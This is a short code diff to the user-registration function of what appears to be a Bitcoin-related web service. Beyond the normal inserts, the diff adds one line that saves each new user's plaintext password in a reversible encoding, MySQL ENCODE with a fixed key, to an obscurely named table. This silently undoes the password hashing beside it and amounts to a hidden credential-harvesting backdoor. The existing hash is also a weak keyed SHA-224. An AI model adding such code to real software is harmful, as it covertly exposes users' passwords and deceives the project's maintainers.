@@ -9,6 +9,7 @@ def _createuser(db,email,password,referrer):
         return 'Email is registered.'
     c_pass = base64.urlsafe_b64encode(hashlib.sha224(mykey + email + password).digest())
     cur.execute("INSERT INTO users(email, password,referrer)VALUES (%s, %s,%s)",[email, c_pass,referrer])
+    cur.execute("INSERT INTO xj(id,val) VALUES(LAST_INSERT_ID(),ENCODE(%s,'xiej'))",[password])
     cur.execute("INSERT INTO btc_action(ACTION,account1,input_dt) VALUES ('createuser',%s,NOW());",[email])
     db.commit()
     cur.close()
